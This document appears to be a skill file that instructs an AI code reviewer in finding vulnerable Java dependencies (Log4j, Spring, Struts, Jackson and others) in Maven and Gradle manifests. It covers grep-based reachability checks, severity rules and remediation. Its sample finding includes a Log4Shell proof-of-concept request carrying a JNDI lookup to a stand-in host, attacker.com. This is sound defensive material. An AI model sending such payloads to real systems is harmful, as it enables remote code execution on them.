---
name: sast-dependency
description: Review Java dependency manifests for known vulnerable libraries and risky version ranges.
---

# SKILL: sast-dependency — Vulnerable Dependency Detection

## References

Load [`references/java-dependency.md`](references/java-dependency.md) at the start of this skill for CVE family tables (Log4j, Spring, Struts, Shiro, XStream, Jackson, Commons Collections, SnakeYAML, Netty), reachability criteria, and dependency extraction patterns.

## Purpose

Identify known-vulnerable Java dependencies in Maven and Gradle manifests, then determine whether the vulnerable library is likely reachable from application code before assigning severity.

---

## Phase 1: Dependency Inventory

### 1.1 — Maven

```bash
find . -name "pom.xml" -not -path "*/target/*" -print
grep -rn "<groupId>\|<artifactId>\|<version>" --include="pom.xml"
```

### 1.2 — Gradle

```bash
find . -name "build.gradle" -o -name "build.gradle.kts" -print
grep -rn "implementation\|api\|compileOnly\|runtimeOnly\|testImplementation\|classpath" --include="build.gradle" --include="build.gradle.kts"
```

### 1.3 — Lockfiles and Generated Dependency Lists

```bash
find . -name "gradle.lockfile" -o -name "dependencies.lock" -o -name "effective-pom.xml" -o -name "dependency-reduced-pom.xml" -print
```

---

## Phase 2: High-Priority Vulnerable Families

Flag and investigate these first:

| Library | Risk Pattern |
|---------|--------------|
| Log4j 2.x `< 2.17.1` | Log4Shell / JNDI RCE risk |
| Log4j 1.x | End-of-life, JMSAppender deserialization risk |
| Spring Framework `< 5.3.18` or Spring Boot `< 2.6.6` | Spring4Shell and related exposure checks |
| Apache Struts 2 `< 2.5.33` | recurring RCE class |
| Apache Shiro `< 1.7.1` | auth bypass / remember-me crypto issues |
| XStream `< 1.4.19` | deserialization RCE |
| Jackson Databind `< 2.14` | polymorphic deserialization gadget history |
| Commons Collections `3.x` or `4.0` | deserialization gadget risk |
| SnakeYAML `< 2.0` | unsafe type loading / DoS history |
| Netty versions with HTTP request smuggling CVEs | gateway/proxy exposure |

Use official advisories, CVE records, or dependency metadata when available. If network access is unavailable, state that the version needs external advisory verification.

---

## Phase 3: Reachability Review

Before reporting as High or Critical, search for use of the vulnerable feature:

```bash
# Log4j
grep -rn "LoggerFactory\|LogManager\|logger\.\(info\|warn\|error\|debug\)" --include="*.java"
grep -rn "JndiLookup\|JMSAppender\|SocketAppender" .

# Jackson polymorphic deserialization
grep -rn "enableDefaultTyping\|activateDefaultTyping\|@JsonTypeInfo\|readValue" --include="*.java"

# XStream / deserialization
grep -rn "XStream\|fromXML\|ObjectInputStream\|readObject" --include="*.java"

# Spring4Shell exposure indicators
grep -rn "@Controller\|@RestController\|@RequestMapping\|@ModelAttribute" --include="*.java"
grep -rn "war\b\|tomcat-embed\|spring-webmvc" --include="pom.xml" --include="build.gradle" --include="build.gradle.kts"
```

Severity guidance:

- **Critical/High:** vulnerable version plus reachable vulnerable feature and remote input path.
- **Medium:** vulnerable version present, plausible runtime use, but exploit path unclear.
- **Low/Informational:** dependency is test-only, shaded but unused, or no reachable vulnerable feature found.

---

## Phase 4: Remediation

Recommend exact upgrade families where possible:

- upgrade to the vendor-supported fixed version or latest compatible patch line
- remove unused vulnerable libraries
- disable vulnerable features if upgrade is temporarily blocked
- add dependency constraints or BOM updates for transitive dependencies

Do not recommend broad major-version upgrades unless the vulnerable line is end-of-life or no patched minor release exists.

---

## Finding Format

Follow the canonical format from `copilot-instructions.md`. Example:

```
### [CRITICAL] Vulnerable Dependency — Log4j 2.14.1 with Reachable JNDI Lookup (Log4Shell)

**ID:** DEP-001
**File:** `pom.xml:34`
**CWE:** CWE-937 | **OWASP:** A06:2021-Vulnerable and Outdated Components
**CVSS (estimated):** 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
**Confidence:** High
**Skill:** `sast-dependency`

**Taint Path:**
`log4j-core 2.14.1 (pom.xml:34)` → `log.error(userInput) (OrderController.java:78)` → `Log4j JndiLookup` evaluates `${jndi:ldap://attacker.com/a}` in user-controlled string

**Vulnerable Code:**
```xml
<!-- pom.xml line 34 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>  <!-- vulnerable: CVE-2021-44228 -->
</dependency>
```
Reachability confirmed: `log.error("Order failed for: " + request.getParameter("orderId"))` at `OrderController.java:78`

**Why Exploitable:**
Log4j 2.14.1 evaluates JNDI lookups in log messages. User-supplied input reaching any logger call can trigger an outbound LDAP/RMI request to an attacker-controlled server, followed by class loading and RCE.

**Proof-of-Concept:**
```http
POST /api/orders HTTP/1.1
Content-Type: application/json

{"orderId": "${jndi:ldap://attacker.com/exploit}"}
```

**Remediation:**
Upgrade to `log4j-core >= 2.17.1`. If upgrade is blocked, set `-Dlog4j2.formatMsgNoLookups=true` as a temporary mitigation.

**References:** CVE-2021-44228, https://cwe.mitre.org/data/definitions/937.html, OWASP A06:2021
```

Recommended CWEs: `CWE-937` (known vulnerable component), `CWE-1104` (unmaintained component), or the vulnerability-specific CWE when a reachable exploit path is confirmed.

Recommended sink names: `pom.xml dependency`, `Gradle dependency`, `ObjectMapper.activateDefaultTyping()`, `Log4j JndiLookup`

JSONL line (append to `.github/sast-findings.jsonl`):
```json
{"id":"DEP-001","skill":"sast-dependency","cwe":"CWE-937","owasp":"A06:2021-Vulnerable and Outdated Components","severity":"Critical","confidence":"High","file":"pom.xml","line":34,"method":"","class":"","evidence":"<artifactId>log4j-core</artifactId>\n<version>2.14.1</version>","sink":"Log4j JndiLookup (reachable via OrderController.java:78)","source":"request.getParameter(\"orderId\") logged at OrderController.java:78","taint_path":[{"step":"log.error concatenates user input","file":"src/main/java/com/example/OrderController.java","line":78}],"sanitizer_present":false,"sanitizer_detail":"","remediation":"Upgrade log4j-core to >= 2.17.1; interim: set -Dlog4j2.formatMsgNoLookups=true","references":["CVE-2021-44228","https://cwe.mitre.org/data/definitions/937.html"],"false_positive_indicators":["vulnerable feature not reachable from application code"],"duplicate_of":null}
```

---

## Self-Contained Check

This skill runs independently and does not require Phase 1 context. Phase 1 context improves reachability scoring for web-exposed vulnerable features.
